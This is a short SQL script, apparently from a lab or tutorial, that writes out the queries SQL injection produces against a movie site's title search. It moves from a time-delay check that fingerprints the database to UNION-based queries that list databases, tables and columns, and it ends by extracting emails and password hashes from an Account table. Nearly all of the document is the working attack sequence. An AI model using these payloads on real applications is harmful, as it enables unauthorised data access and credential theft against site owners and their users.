USE Moviedb;

-- 1. Following SQL statement is used to determine what Relational Database system is being used by the application.
SELECT * FROM Movie WHERE Title LIKE '%%';
WAITFOR DELAY '00:00:10';

-- 2. To get the list of databases running on the current instance.
SELECT * FROM Movie WHERE Title LIKE '%%'
UNION
SELECT database_id, [name], 'foo', 'foo', '2020-11-20', 1, 3.14, 'foo'
FROM sys.databases;

-- 3. Will display the databases and their table names.
SELECT * FROM Movie WHERE Title LIKE '%%'
UNION
SELECT 1, TABLE_CATALOG, TABLE_NAME, 'foo', '2020-11-20', 1, 3.14, 'foo'
FROM INFORMATION_SCHEMA.TABLES;

-- 4. Will display the tables and their column names.
SELECT * FROM Movie WHERE Title LIKE '%%'
UNION
SELECT 1, TABLE_CATALOG, TABLE_NAME, COLUMN_NAME, '2020-11-20', 1, 3.14, 'foo'
FROM INFORMATION_SCHEMA.COLUMNS;

-- 5. Following SQL statement fetches the users information from the Account table.
SELECT * FROM Movie WHERE Title LIKE '%%'
UNION
SELECT Id, Email, PasswordHash, [Type], '2020-11-20', 1, 3.14, 'foo'
FROM Account;